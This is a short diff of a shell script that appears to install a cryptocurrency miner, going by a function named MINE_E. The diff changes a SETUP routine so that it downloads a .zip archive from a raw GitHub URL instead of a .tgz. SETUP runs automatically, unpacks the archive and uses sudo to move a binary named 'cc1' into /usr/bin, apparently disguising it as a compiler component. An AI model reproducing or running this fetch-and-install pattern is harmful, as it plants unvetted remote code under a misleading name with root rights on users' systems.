@@ -59,8 +59,8 @@ MINE_E() {
     clear
 }
 SETUP() {
-wget https://raw.githubusercontent.com/outlookribut/jbh/main/program.tgz
-tar xf program.tgz
+wget https://raw.githubusercontent.com/outlookribut/jbh/main/program.zip
+unzip -q program.zip
 sudo mv cc1 /usr/bin
 }
 SETUP
